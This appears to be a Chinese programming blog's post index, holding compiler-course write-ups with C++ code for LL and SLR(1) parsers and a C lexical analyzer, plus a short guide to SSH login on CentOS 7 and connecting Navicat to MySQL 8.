(first_beta.count(&quot;E&quot;)) { tmp = compute_follow(sspair.first); FOLLOW[expr].insert(tmp.begin(), tmp.end()); } // Everything in FIRST[beta] is in FOLLOW[expr] except E(see outside the loop) FOLLOW[expr].insert(first_beta.begin(), first_beta.end()); } } } } FOLLOW[expr].erase(&quot;E&quot;); return FOLLOW[expr];} FOLLOW 集的递归边界不能像 FIRST 集一样简单粗暴，所以我设置了： 1str_set follow_visited; // if FOLLOW[str] has been computed 来记录该符号的 FOLLOW 集是否已经被计算过。这是因为存在这样一组略有些棘手的“右递归”的文法： 12stmt -&gt; ifstmt | whilestmt | assgstmt | compoundstmtifstmt -&gt; if ( boolexpr ) then stmt else stmt 于是，相应的主函数计算代码也要改： 1234567891011prog += &quot; $&quot;;// Init FOLLOWtmp.clear();tmp.insert(&quot;$&quot;);FOLLOW.insert(make_pair(&quot;program&quot;, tmp));for (int i = 0; i &lt; 2; ++i) { follow_visited.clear(); for (const auto &amp;expr: nt) { compute_follow(expr.first); }} 其中prog是读入的程序字符串。 我们可以测试一下计算是否正确： 1234567891011121314/* Test if FIRST and FOLLOW are correct */void ff_test() { for (const auto &amp;expr: nt) { cout &lt;&lt; expr.first &lt;&lt; &quot; :: &quot;; for (const string &amp;s: FIRST[expr.first]) { cout &lt;&lt; s &lt;&lt; &quot;, &quot;; } cout &lt;&lt; &quot; :: &quot;; for (const string &amp;s: FOLLOW[expr.first]) { cout &lt;&lt; s &lt;&lt; &quot;, &quot;; } cout &lt;&lt; endl; }} 构造 LL 分析表处理好下标，直接套算法就完成了。这里就凸显出前面nt和t采用map&lt;string, int&gt;存储的优势，使得由一个符号找到它对应于表中的位置十分方便。 注意：在nt中我把$也当作终结符处理，这样在代码中的step 3就不用拆成两步了，比较方便。但实际上$既不是终结符也不是非终结符。 1234567891011121314151617181920212223/* Construct the LL parsing table */void construct_table() { str_set first_alpha, follow_alpha; int A; // for all rules A -&gt; alpha for (const auto &amp;sspair: rules) { first_alpha = FIRST[next_str(sspair.second, 0)]; follow_alpha = FOLLOW[sspair.first]; A = nt[sspair.first]; // step 2(unfortunately index must be number) for (const auto &amp;terminal: t) { if (first_alpha.count(terminal.first) &amp;&amp; terminal.first != &quot;E&quot;) { table[A][t[terminal.first]] = sspair.second; } } if (first_alpha.count(&quot;E&quot;)) { // step 3 for (const string&amp; b: follow_alpha) { table[A][t[b]] = sspair.second; } } }} 测试一下（针对较简单 CFG 情况写的）： 12345678910/* Test if the parsing table is correct */void table_test() { cout &lt;&lt; &quot;+ * ( ) id E $&quot; &lt;&lt; endl; for (int i = 0; i &lt; 5; ++i) { for (int j = 0; j &lt; 7; ++j) { cout &lt;&lt; table[i][j] &lt;&lt; &quot; | &quot;; } cout &lt;&lt; endl; }} 进行语法分析本来是想用stack实现的，但是一看需要的输出，很显然用等价的递归是更方便的。 随后，注意到语法错误需要在一开始输出，而如果递归处理是会边处理边输出的，因此考虑扫描两次，第一次不输出，但当发现语法错误后输出提示信息并不再扫描；第二次才边处理边输出。所以加了bool scan参数，scan == true表示处于第一次的“扫描模式”。 123456789101112131415161718192021222324252627282930313233343536373839404142434445/* This func can both scan the prog to find mistakes and do the parsing */void parse(const string top, int tab_cnt, bool scan) { if (!scan) { if (top != &quot;program&quot;) { cout &lt;&lt; endl; for (int i = 0; i &lt; tab_cnt; ++i) { cout &lt;&lt; &quot;\\t&quot;; } } cout &lt;&lt; top; } else { if (flag) return; } string input_top = next_str(input, 0); if (top == input_top) { string::size_type start = input.find_first_not_of(&quot; \\n\\t&quot;, input_top.size()); if (scan &amp;&amp; input.substr(0, start).find('\\n') != string::npos) { // in scan mode, when we're bypassing a \\n ++line; } // get rid of input_top input = input.substr(start); return; } else if (top == &quot;E&quot;) { // in case of unnecessary trouble return; } else if (scan &amp;&amp; t.count(top)) { // in scan mode, top is a terminal but cannot match input_top, indicating a mistake cout &lt;&lt; &quot;语法错误,第&quot; &lt;&lt; line-1 &lt;&lt; &quot;行,缺少\\&quot;&quot; &lt;&lt; top &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; endl; string::size_type ins = prog.find(input); // find the insertion point prog.insert(ins, &quot; &quot; + top + &quot; &quot;); // fix the mistake flag = true; // stop scanning return; } string rhs = table[nt[top]][t[input_top]]; string cur; stringstream ss(rhs); while (ss &gt;&gt; cur) { parse(cur, tab_cnt + 1, scan); }} 需要全局变量： 123string input;int line = 1;bool flag; // if the scanning is over 主函数中，就只需要： 12345// Scan, then parseinput = prog;parse(&quot;program&quot;, 0, true);input = prog;parse(&quot;program&quot;, 0, false); 坑点 如果不从较简单的情况开始，会很容易出错 空白符（\\n \\t）的处理，一定要复制输入而不是手打，不然会像我一样被坑两三个小时 “右递归”的存在使得 FOLLOW 集计算很容易出错，而看起来像是对的（这里感觉递归的方法不如循环） 行数统计 定位错误在原来程序字符串中的位置，并修复","link":"/post/LLparser/"},{"title":"LR语法分析器","text":"天 坑 预 警 概述这次需要用SLR(1)方法也就是自底向上的方法实现语法分析器，并且需要识别并改正简单的语法错误（这里只出现了漏分号的错误）。举个栗子，输入： 123456{while ( ID == NUM ){ID = NUM}} 需要按这个格式输出： 12345678910111213141516171819202122232425262728293031语法错误，第4行，缺少&quot;;&quot;program =&gt;compoundstmt =&gt;{ stmts } =&gt;{ stmt stmts } =&gt;{ stmt } =&gt;{ whilestmt } =&gt;{ while ( boolexpr ) stmt } =&gt;{ while ( boolexpr ) compoundstmt } =&gt;{ while ( boolexpr ) { stmts } } =&gt;{ while ( boolexpr ) { stmt stmts } } =&gt;{ while ( boolexpr ) { stmt } } =&gt;{ while ( boolexpr ) { assgstmt } } =&gt;{ while ( boolexpr ) { ID = arithexpr ; } } =&gt;{ while ( boolexpr ) { ID = multexpr arithexprprime ; } } =&gt;{ while ( boolexpr ) { ID = multexpr ; } } =&gt;{ while ( boolexpr ) { ID = simpleexpr multexprprime ; } } =&gt;{ while ( boolexpr ) { ID = simpleexpr ; } } =&gt;{ while ( boolexpr ) { ID = NUM ; } } =&gt;{ while ( arithexpr boolop arithexpr ) { ID = NUM ; } } =&gt;{ while ( arithexpr boolop multexpr arithexprprime ) { ID = NUM ; } } =&gt;{ while ( arithexpr boolop multexpr ) { ID = NUM ; } } =&gt;{ while ( arithexpr boolop simpleexpr multexprprime ) { ID = NUM ; } } =&gt;{ while ( arithexpr boolop simpleexpr ) { ID = NUM ; } } =&gt;{ while ( arithexpr boolop NUM ) { ID = NUM ; } } =&gt;{ while ( arithexpr == NUM ) { ID = NUM ; } } =&gt;{ while ( multexpr arithexprprime == NUM ) { ID = NUM ; } } =&gt;{ while ( multexpr == NUM ) { ID = NUM ; } } =&gt;{ while ( simpleexpr multexprprime == NUM ) { ID = NUM ; } } =&gt;{ while ( simpleexpr == NUM ) { ID = NUM ; } } =&gt;{ while ( ID == NUM ) { ID = NUM ; } } CFG、起始符、保留字与上一篇LL语法分析器相同。 思路与代码很容易发现，LL语法分析器中的一些已经确认正确的函数在这里可以使用，例如compute_first和compute_follow等。因此这次我们将基于LL语法分析的代码进行修改。 准备工作存储上不需要太多变化。对于规则的存储，因为这次在推导LR(0)项目集时，规则需要是有序的（为什么？），因此multimap可以换成vector&lt;pair&lt;string, string&gt; &gt;。 123456789101112131415161718192021222324252627282930313233343536373839const vector&lt;pair&lt;string, string&gt; &gt; rules = { {&quot;program'&quot;, &quot;program&quot;}, {&quot;program&quot;, &quot;compoundstmt&quot;}, {&quot;stmt&quot;, &quot;ifstmt&quot;}, {&quot;stmt&quot;, &quot;whilestmt&quot;}, {&quot;stmt&quot;, &quot;assgstmt&quot;}, {&quot;stmt&quot;, &quot;compoundstmt&quot;}, {&quot;compoundstmt&quot;, &quot;{ stmts }&quot;}, {&quot;stmts&quot;, &quot;stmt stmts&quot;}, {&quot;stmts&quot;, &quot;E&quot;}, {&quot;ifstmt&quot;, &quot;if ( boolexpr ) then stmt else stmt&quot;}, {&quot;whilestmt&quot;, &quot;while ( boolexpr ) stmt&quot;}, {&quot;assgstmt&quot;, &quot;ID = arithexpr ;&quot;}, {&quot;boolexpr&quot;, &quot;arithexpr boolop arithexpr&quot;}, {&quot;boolop&quot;, &quot;&lt;&quot;}, {&quot;boolop&quot;, &quot;&gt;&quot;}, {&quot;boolop&quot;, &quot;&lt;=&quot;}, {&quot;boolop&quot;, &quot;&gt;=&quot;}, {&quot;boolop&quot;, &quot;==&quot;}, {&quot;arithexpr&quot;, &quot;multexpr arithexprprime&quot;}, {&quot;arithexprprime&quot;, &quot;+ multexpr arithexprprime&quot;}, {&quot;arithexprprime&quot;, &quot;- multexpr arithexprprime&quot;}, {&quot;arithexprprime&quot;, &quot;E&quot;}, {&quot;multexpr&quot;, &quot;simpleexpr multexprprime&quot;}, {&quot;multexprprime&quot;, &quot;* simpleexpr multexprprime&quot;}, {&quot;multexprprime&quot;, &quot;/ simpleexpr multexprprime&quot;}, {&quot;multexprprime&quot;, &quot;E&quot;}, {&quot;simpleexpr&quot;, &quot;ID&quot;}, {&quot;simpleexpr&quot;, &quot;NUM&quot;}, {&quot;simpleexpr&quot;, &quot;( arithexpr )&quot;} /*{&quot;e'&quot;, &quot;e&quot;}, {&quot;e&quot;, &quot;e + t&quot;}, {&quot;e&quot;, &quot;t&quot;}, {&quot;t&quot;, &quot;t * f&quot;}, {&quot;t&quot;, &quot;f&quot;}, {&quot;f&quot;, &quot;( e )&quot;}, {&quot;f&quot;, &quot;id&quot;}*/}; 与LL语法分析类似，由易到难总是能减轻一些工作量，因此最后被注释掉的部分是我们引入的一个更简单的CFG，用于方便地进行正确性测试。注意这次多了一条规则program' -&gt; program，这是LR分析需要的增广文法。 终结符与非终结符的存储不变，除了增加了一个非终结符program'。 FIRST集和FOLLOW集的存储不变。 最后是存储LR分析表，分为action表和goto表。goto表由于只有需要goto的状态的数字，用二维int数组是很自然的想法。而action表需要存储s_n和r_n这两种表项（n为数字），如果用字符串存储那么在查询表项时还需要进行一次字符串处理（找出是shift还是reduce，以及对应的数字），十分麻烦。 但是由于只有shift和reduce两种操作，我们可以全部采用int存储，然后借助数字的正负判断该操作是shift还是reduce。 计算FIRST集和FOLLOW集在SLR(1)语法分析中只需要FOLLOW集，然而要计算FOLLOW集是需要一部分特定的FIRST集的。因此我们还是两者都要算。 原理没有变，代码其实也没有太大的变化。唯一需要注意的是，由于LR分析中可能遇到左递归文法（例如用来测试的CFG），相应FIRST集的计算会陷入死循环。解决方法是懒计算FIRST集，即并不对FIRST集进行预计算，而是在计算FOLLOW集过程中需要对应FIRST集时才做计算，这样可以有效避开死循环的问题。 因此，FIRST集在主函数中只做基本的初始化： 1234567// Init FIRSTstr_set tmp;for (const auto &amp;expr: t) { tmp.clear(); tmp.insert(expr.first); FIRST.insert(make_pair(expr.first, tmp));} FOLLOW集中的变化： 12//first_beta = FIRST[next_str(sspair.second, end+1)];first_beta = compute_first(next_str(sspair.second, end+1)); 测试函数不变。 闭包函数闭包有两种计算方法：循环和递归。在被看似优雅的递归坑过后，我知道为什么推荐的方法是循环了。可能是被FIRST集和FOLLOW集的递归算法坑得还不够惨。 我们知道，状态I的闭包首先包括本身，随后对于I中任意的规则A -&gt; aa.Bbb，B是非终结符且B -&gt; y1 | y2 | ... | yn，有B -&gt; .y1 | .y2 | .... | .yn也属于I的闭包。那么问题来了，A能否等于B? 最初，我以为是不可以的，因为我忽略了aa的存在，认为这种规则存在左递归，因此应该立即停止递归运算。然而，aa的存在允许了A = B的成立，此时继续递归并不会无限循环。 排掉这个雷后，代码没什么难的了： 1234567891011121314151617181920212223/* Compute the closure of a state recursively */State closure(State I) { State ret = I; State tmp; string non_terminal; for (const Rule &amp;rule: I) { // A -&gt; xx.Bxx exists in I, and &quot;. is at head while A = B&quot; is not true in case of right recursive CFG if (nt.count(non_terminal = next_str(rule.rhs, rule.point_pos)) &amp;&amp; !(non_terminal == rule.lhs &amp;&amp; rule.point_pos == 0)) { tmp.clear(); for (const auto &amp;sspair: rules) { if (sspair.first == non_terminal) { // put in B -&gt; y1, B -&gt; y2, ... tmp.emplace_back(sspair.first, sspair.second); } } tmp = closure(tmp); ret.insert(ret.end(), tmp.begin(), tmp.end()); } } return ret;} 这里就需要用到特地为LR分析写的Rule对象： 123456789101112131415class Rule {public: string::size_type point_pos; // position of the point string lhs, rhs; Rule() {} Rule(string _lhs, string _rhs, string::size_type _point_pos=0):lhs(_lhs), rhs(_rhs), point_pos(_point_pos) {} bool operator == (const Rule &amp;r) const { return (lhs == r.lhs &amp;&amp; rhs == r.rhs &amp;&amp; point_pos == r.point_pos); }};typedef vector&lt;Rule&gt; State; // I_0, I_1, ...vector&lt;State&gt; graph; // DFA graph 闭包函数的测试比较麻烦，最好多测几个状态，这样才能发现潜在的问题。注意：闭包函数如果存在问题，很有可能导致后面分析表正确的情况下依然得到错误的结果或陷入死循环。 构造DFA与分析表这一步需要一边构造DFA，一边填action和goto表。手动画下图，可以发现这里构造DFA的算法无非是一个BFS。 但是和BFS不同，这里不需要用队列实现，因为需要存好已经计算出的状态（而不是舍弃），在后面状态的计算中与之比对，防止重复状态带来的冗余。所以数组存下来就好。 从起始符开始逐状态计算，对于已计算的状态（往往只有1-2个规则），只有求过一次闭包后才能说这个状态是完整的（可能拓展到近10条规则）。但有趣的是，只要判断两个状态的第一条规则是否完全相同（包括点的位置），就可以判断两个状态是否是重复的（为什么？）。这样就舒服了很多。 剩余的内容就是套路了。在下面的代码中用到了goto这个饱受诟病的关键字（不是goto表！），然而在跳出多层循环时，必须承认使用goto绝对是利大于弊的。 123456789101112131415161718192021222324252627282930313233343536373839404142434445/* Construct the DFA graph of States */void build_graph() { State I0; I0.emplace_back(start_symbol + &quot;'&quot;, start_symbol); graph.push_back(I0); string pointed; // the symbol being pointed at State new_state; for (int cur = 0; cur != graph.size(); ++cur) { // every State in graph graph[cur] = closure(graph[cur]); // now we can say graph[cur] is complete for (int i = 0; i &lt; graph[cur].size(); ++i) { // every Rule in graph[cur] Rule &amp;rule = graph[cur][i]; pointed = next_str(rule.rhs, rule.point_pos); if (pointed == &quot;E&quot;) { // . is at the tail, reduce if (rule.lhs == start_symbol + &quot;'&quot;) { action[cur][t[&quot;$&quot;]] = acc; } else { for (const string &amp;expr: FOLLOW[rule.lhs]) { // SLR: consider every terminal in FOLLOW action[cur][t[expr]] = -1 * distance(rules.begin(), find(rules.begin(), rules.end(), make_pair(rule.lhs, rule.rhs))); } } continue; } int &amp;target = nt.count(pointed) ? go_to[cur][nt[pointed]] : action[cur][t[pointed]]; // the target blank we're filling if (target == 0) { // the blank is not already filled target = graph.size(); for (int j = 1; j &lt; graph.size(); ++j) { if (graph[j][0] == Rule(rule.lhs, rule.rhs, rule.point_pos + pointed.size() + 1)) { target = j; // replace the target by the real State goto dup; } } graph.emplace_back(new_state); // create the new empty state } graph[target].emplace_back(rule.lhs, rule.rhs, rule.point_pos + pointed.size() + 1);dup: ; } }} 进行语法分析这次的输出，和LL语法分析不同，对循环结构更友好。果断用stack实现。 需要注意的就是行数统计不要重复统计，我这里放在了shift情况里。至于reduce中要注意的就是E这个代表ε的字符，在考虑规则右边的符号个数时，它是不能被算作一个符号的，这一度让我对着死循环迷惑了很久。 其余的依旧是套路，最后在遇到为0的表项时说明发生了语法错误，这里错误处理偷了个懒。 12345678910111213141516171819202122232425262728293031323334353637383940414243void parse() { stack&lt;string&gt; s; s.push(&quot;0&quot;); int num, len, tmp; string input_top; string::size_type start; out.clear(); while (!(s.top() == &quot;1&quot; &amp;&amp; input == &quot;$&quot;)) { input_top = next_str(input, 0); if ((num = action[stoi(s.top())][t[input_top]]) &gt; 0) { // shift start = input.find_first_not_of(&quot; \\n\\t&quot;, input_top.size()); if (input.substr(0, start).find('\\n') != string::npos) { // when we're bypassing a \\n ++line; } s.push(input_top); s.push(to_string(num)); input = input.substr(start); // get rid of input_top } else if (num &lt; 0) { // reduce num = -num; out.push_back(num); len = count(rules[num].second.begin(), rules[num].second.end(), ' ') + 1; // num of symbols if (rules[num].second == &quot;E&quot;) { // but!!! E is special len = 0; } for (int i = 0; i &lt; (len&lt;&lt;1); ++i) { s.pop(); } tmp = go_to[stoi(s.top())][nt[rules[num].first]]; s.push(rules[num].first); s.push(to_string(tmp)); } else { // mistake cout &lt;&lt; &quot;语法错误，第&quot; &lt;&lt; line-1 &lt;&lt; &quot;行，缺少\\&quot;;\\&quot;&quot; &lt;&lt; endl; input = &quot;; &quot; + input; } }} 输出相对简单，但也有坑。首先E依然要特判，输出时不能输出，而且还要“倒扣”一个字符。 然后是这里在替换（也就是归约）子串时，用了rfind方法定位而不是find，因为是最右推导嘛。 12345678910111213141516void output() { string output = start_symbol; pair&lt;string, string&gt; rule; cout &lt;&lt; output &lt;&lt; &quot; =&gt; &quot;; for (string::size_type i = out.size()-1; i &gt; 0; --i) { rule = rules[out[i]]; string new_str = (rule.second == &quot;E&quot; ? &quot;&quot; : rule.second); // deal with E and ws output.replace(output.rfind(rule.first), rule.first.size() + (rule.second == &quot;E&quot;), new_str); cout &lt;&lt; endl &lt;&lt; output &lt;&lt; &quot; =&gt; &quot;; } rule = rules[out[0]]; cout &lt;&lt; endl &lt;&lt; output.replace(output.rfind(rule.first), rule.first.size(), rule.second) &lt;&lt; &quot; &quot;;} 坑点都是能让人迷惑一段时间的坑，这就是LR语法分析更难的地方吧： 左递归文法FIRST集的懒计算处理 闭包函数左右非终结符相同的情况处理 状态去重 E不能算作一个符号 输出时E的特判 替换最右端的那个子串","link":"/post/LRparser/"},{"title":"走远了的词法分析器","text":"奇怪的思路果然总是通向奇怪的出路。 概述编译原理课的实训题，难度是不大的，然而我自作聪明地用stringstream强行给自己增加了难度…… 实际上，即使增加了这点难度，这次实训依然不难，然而有两个天坑： 对于格式化字符串里诸如%d的字符，需要将其视为一个词素 注释也被算作词素，需要被打印出来 这两条都是实训题人为规定的。第一条或许还能理解，但是真正实现起来会是代码复杂很多，因此我在代码里暴力绕过了这个限制。 注：为什么说实现第一条比较复杂？ 这不仅是因为C语言中存在%运算符，即取模，还因为格式化字符串本身十分灵活。不妨考虑遇到如下五种模式时如何匹配： 123456789101112131415printf(&quot;%d&quot;, i); // 普通情况printf(&quot;%-5d&quot;, i); // 右对齐，或者高位补0等操作printf(&quot;%.2f&quot;, i); // 浮点数精度printf(&quot;%d %d %d&quot;, i, j, k); // 多个空格隔开的%d使得识别%前面的&quot;来判断是否在字符串内变得不可行printf(&quot;50%% %d&quot;, i); // %本身的转义a = a%d; // 字符串外的取模符号/* 解决方法还是有的： * 记录`&quot;`的开闭状态来判断当前的`%`是否在字符串中，对`%-`，`%.`和`%%`特判。 * 但是这样就有点复杂了。 */ 第二条就恶心得多了。众所周知，处理注释的最好方法是在一开始就删掉它（我最初也是这么做的），然而由于第二条规定的存在，我不得不使用一些小技巧来达到要求。这也是这次走远了的主要原因，为此我多花了一个小时。关于这些技巧会在后面详述。 思路代码的主要思想是用map存词素对应编号，借助stringstream对象按空白符分隔程序语句逐条处理（然而这并没有多大用，因为C语言很多地方是允许不空格的，我最后还是得逐字符分析）。 对于数字开头的一段字符，可以确定直到非数字字符之前都是同一个数字，算作一个词素。 如果我们运气足够好（编译代码风格较好的C代码），stringstream分出来的语句大多能匹配上map里的词素。不过实际情况中我们可以认为这是小概率事件，所以放在了else而不是if里。 接下来就是针对分离出来的这一小段cur作扫描了，本来可以用递归优雅地扫描，然而如果出现很长一段没有空格的语句，递归可能使栈溢出，因此这里采用循环来替代。先从左至右匹配map里的词素，直到第一次匹配成功。 匹配成功并没有结束，我们还需要进行贪婪匹配。举个栗子，&lt;&lt;=可以匹配&lt;，&lt;&lt;和&lt;&lt;=三个词素，显然我们应匹配最后一个，也就是尽可能长的那个词素。匹配完成后输出，并跳过已匹配的那一段继续。 也有可能我们在第3步根本无法匹配成功，这说明该串以标识符开头，例如main()，因此我们把标识符名拿出来以后再继续。方法是扫描至第一个不是下划线/字母/数字的字符为止。 本来这样就结束了，我可以高高兴兴地删掉注释、trim掉两边空格、处理下最后一行不能换行的无聊问题后就搞定的。然而。。。为什么注释要被当作词素打印出来？？这种做法完全是不合理而低效的。 注释的处理代码长度因为处理毫无处理必要的注释增加了许多。首先在清除注释时（对，我一定要清除注释）先把注释内容按单行/多行保存到两个数组里，随后是杂技表演时间： 对于单行注释，用@n替换原注释，因为@这个符号在C源代码里没有什么特殊含义，也不能在标识符中出现（$是可以的，有点奇怪）。其中n表示这是第n个单行注释。 对于多行注释同理，用`n替换原注释。 于是扫描时，当我们发现一个语句无法匹配词素、且截取标识符也没有变动下标时，只可能是遇到了单字母变量，或者是我们作的这两个标记之一。isalpha排除掉前者情况，这时拿出刚才数组里存的对应注释内容，打印输出即可。 这种杂技看似好玩，实际上也是走远了之后的无奈之举，我觉得肯定是存在隐患的，也并不利于维护。因此强烈不推荐用这种方法，直接清除注释的办法高到不知道哪里去了。 C++代码不到200行。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199// C语言词法分析器#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;map&gt;#include &lt;string&gt;#include &lt;fstream&gt;#include &lt;sstream&gt;#include &lt;vector&gt;using namespace std;/* 不要修改这个标准输入函数 */void read_prog(string&amp; prog){ char c; while(scanf(&quot;%c&quot;,&amp;c)!=EOF){ prog += c; }}/* 你可以添加其他函数 */map&lt;string, int&gt; tokens = { {&quot;auto&quot;, 1}, {&quot;break&quot;, 2}, {&quot;case&quot;, 3}, {&quot;char&quot;, 4}, {&quot;const&quot;, 5}, {&quot;continue&quot;, 6}, {&quot;default&quot;, 7}, {&quot;do&quot;, 8}, {&quot;double&quot;, 9}, {&quot;else&quot;, 10}, {&quot;enum&quot;, 11}, {&quot;extern&quot;, 12}, {&quot;float&quot;, 13}, {&quot;for&quot;, 14}, {&quot;goto&quot;, 15}, {&quot;if&quot;, 16}, {&quot;int&quot;, 17}, {&quot;long&quot;, 18}, {&quot;register&quot;, 19}, {&quot;return&quot;, 20}, {&quot;short&quot;, 21}, {&quot;signed&quot;, 22}, {&quot;sizeof&quot;, 23}, {&quot;static&quot;, 24}, {&quot;struct&quot;, 25}, {&quot;switch&quot;, 26}, {&quot;typedef&quot;, 27}, {&quot;union&quot;, 28}, {&quot;unsigned&quot;, 29}, {&quot;void&quot;, 30}, {&quot;volatile&quot;, 31}, {&quot;while&quot;, 32}, {&quot;-&quot;, 33}, {&quot;--&quot;, 34}, {&quot;-=&quot;, 35}, {&quot;-&gt;&quot;, 36}, {&quot;!&quot;, 37}, {&quot;!=&quot;, 38}, {&quot;%&quot;, 39}, {&quot;%=&quot;, 40}, {&quot;&amp;&quot;, 41}, {&quot;&amp;&amp;&quot;, 42}, {&quot;&amp;=&quot;, 43}, {&quot;(&quot;, 44}, {&quot;)&quot;, 45}, {&quot;*&quot;, 46}, {&quot;*=&quot;, 47}, {&quot;,&quot;, 48}, {&quot;.&quot;, 49}, {&quot;/&quot;, 50}, {&quot;/=&quot;, 51}, {&quot;:&quot;, 52}, {&quot;;&quot;, 53}, {&quot;?&quot;, 54}, {&quot;[&quot;, 55}, {&quot;]&quot;, 56}, {&quot;^&quot;, 57}, {&quot;^=&quot;, 58}, {&quot;{&quot;, 59}, {&quot;|&quot;, 60}, {&quot;||&quot;, 61}, {&quot;|=&quot;, 62}, {&quot;}&quot;, 63}, {&quot;~&quot;, 64}, {&quot;+&quot;, 65}, {&quot;++&quot;, 66}, {&quot;+=&quot;, 67}, {&quot;&lt;&quot;, 68}, {&quot;&lt;&lt;&quot;, 69}, {&quot;&lt;&lt;=&quot;, 70}, {&quot;&lt;=&quot;, 71}, {&quot;=&quot;, 72}, {&quot;==&quot;, 73}, {&quot;&gt;&quot;, 74}, {&quot;&gt;=&quot;, 75}, {&quot;&gt;&gt;&quot;, 76}, {&quot;&gt;&gt;=&quot;, 77}, {&quot;\\&quot;&quot;, 78}, {&quot;%d&quot;, 81}, {&quot;%s&quot;, 81}, {&quot;%c&quot;, 81}, {&quot;%f&quot;, 81}, {&quot;%lf&quot;, 81}};string cur, tmp;int len, cnt;bool show_time;vector&lt;string&gt; annos[2];/* 打印常数，输出至非数字字符 */void print_num(int &amp;idx) { if (show_time) cout &lt;&lt; endl; cout &lt;&lt; ++cnt &lt;&lt; &quot;: &lt;&quot; &lt;&lt; cur[idx++]; while (isdigit(cur[idx])) { cout &lt;&lt; cur[idx++]; } cout &lt;&lt; &quot;,80&gt;&quot;;}/* 打印非常数词素 */inline void print_token(const string &amp;token, const int &amp;id) { if (show_time) cout &lt;&lt; endl; // 处理最后换行问题 cout &lt;&lt; ++cnt &lt;&lt; &quot;: &lt;&quot; &lt;&lt; token &lt;&lt; &quot;,&quot; &lt;&lt; id &lt;&lt; &quot;&gt;&quot;;}/* 清除所有注释 */void rip_anno(string&amp; prog) { int pos = 0, from, to; while ((from = prog.find(&quot;//&quot;, pos)) != string::npos) { to = prog.find('\\n', from); annos[0].push_back(prog.substr(from, to-from)); // 先保存注释内容 prog.erase(from, to-from); prog.insert(from, &quot;@&quot; + to_string(annos[0].size())); // 插入单行注释标记@ } pos = 0; while ((from = prog.find(&quot;/*&quot;, pos)) != string::npos) { to = prog.find(&quot;*/&quot;, from); annos[1].push_back(prog.substr(from, to-from+2)); prog.erase(from, to-from+2); prog.insert(from, &quot;`&quot; + to_string(annos[1].size())); // 插入多行注释标记` } prog.erase(prog.find_last_not_of(&quot; \\n\\r\\t&quot;) + 1); // 删除尾部空格}void Analysis(){ string prog = &quot;int main()\\n{\\nprintf(\\&quot;HelloWorld\\&quot;);\\nreturn 0;\\n}&quot;; //read_prog(prog); rip_anno(prog); istringstream ss(prog); // 用空格分隔每次读入 while (!ss.eof()) { ss &gt;&gt; cur; len = cur.length(); for (int i = 0; i &lt; len;) { /* 每次for循环开始时，必定是新词素 */ if (isdigit(cur[i])) { print_num(i); } else { if (tokens[cur] == 0) { // 用空格分隔出的串不能直接匹配词素 // 极端情况如：for(var=0;var&lt;10;++var){...;...;}，递归处理可能爆栈，因此用循环 int j = 1, k; while (i + j &lt;= len &amp;&amp; tokens[cur.substr(i, j)] == 0) ++j; // 从左至右尝试匹配词素，直到第一次匹配成功 if (i + j &gt; len) { // 整个串都无法匹配，因此串以标识符开头 for (k = i; k &lt; len &amp;&amp; (cur[k] == '_' || isalnum(cur[k])); ++k); // 截取标识符名 if (k == i &amp;&amp; !isalpha(cur[k])) { // 特判：这里可能是单字母变量，或我们加的注释标记 print_token(annos[cur[k] == '@' ? 0 : 1][cur[k+1]-1 - '0'], 79); i = min(len, k + 2); // 为什么词法分析器要把注释当词素处理而不是直接清除注释？多此一举 } else { print_token(cur.substr(i, k - i), 81); i = k; } } else { while (i + j &lt;= len &amp;&amp; tokens[cur.substr(i, j)] != 0) ++j; // 成功匹配后，进行贪婪匹配 tmp = cur.substr(i, j - 1); print_token(tmp, tokens[tmp]); i += j - 1; // 跳过已被贪婪匹配的词素并继续 } } else { print_token(cur, tokens[cur]); show_time = true; break; } } show_time = true; // 第一个词素已经打印了！ } }}","link":"/post/LexAnalysis/"},{"title":"SSH 远程登录服务器之旅","text":"这次踩坑之旅还算舒适。 远程登录服务器系统为 CentOS 7。 在客户端直接执行： 1ssh root@xx.xx.xx.xx 当然会需要服务器用户名(一般是 root)和密码。值得一提的是这个命令同样可以在 Windows 平台下的各种 Bash（比如 Git Bash）里用。当然 Windows 下更简单的方法是带 GUI 的 PuTTY。 在确保服务器用户名和密码正确，且服务器开启了 22 端口（可以在各大服务商的平台上非常方便地通过 GUI 配置）的情况下，非常容易碰上的问题是： 这是因为 SSH 默认禁止通过用户名+密码登录，登陆到服务器，执行： 1vi /etc/ssh/sshd_config （对，一般我租的 CentOS 7 服务器都默认只有 vi） 查找PasswordAuthentication，将其值改为yes即可。 注：有可能还需要把AllowTCPForwarding设为yes，也有可能不需要。 最后重启 ssh 服务： 123service sshd restart # CentOS 6.x# ORsystemctl restart sshd # CentOS 7.x 连接数据库我这里用的是 Navicat 和 MySQL。 最容易出错的，一是上述服务器端的配置未修改，二是弄错了客户端 Navicat 的配置。 需要这样配置： 常规选项卡： 主机名或 IP 地址：localhost 端口：默认为3306 用户名：数据库用户名 密码：数据库密码 SSH 选项卡： 主机名或 IP 地址： 服务器公网 IP 端口：默认为22 用户名：服务器用户名 密码：服务器密码 有点坑。 随后又遇上了这个奇葩问题： 12Client does not support authentication protocol requestedby server; consider upgrading MySQL client 登上服务器看了眼 MySQL 版本，是 8.0，看来网上（比如 CSDN 和官网文档里（？？？））关于 5.x 版本的解决方案行不通。。 果断上万能的 StackOverFlow，第一条的办法就直接解决了。。 1ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password' 其中password可以是原本的数据库密码。flush privileges似乎可有可无。 为什么这样一条命令就可以连接了呢？这当然要问问刚才并没有帮上什么忙的官方文档了。简单来说，在升级数据库密码哈希方式的时候 MySQL 并没有做到向后兼容。 …… 我太喜欢 StackOverFlow 了。","link":"/post/LoginSSH/"},{"title":"魔法上网的可持续解决方案","text":"因为众所周知的原因，本文中不会提供任何相关工具的下载链接。 就在不久前，我原来使用的免费魔法道具莫名失效了。一怒之下我决定寻找一种可持续的魔法来访问网络。 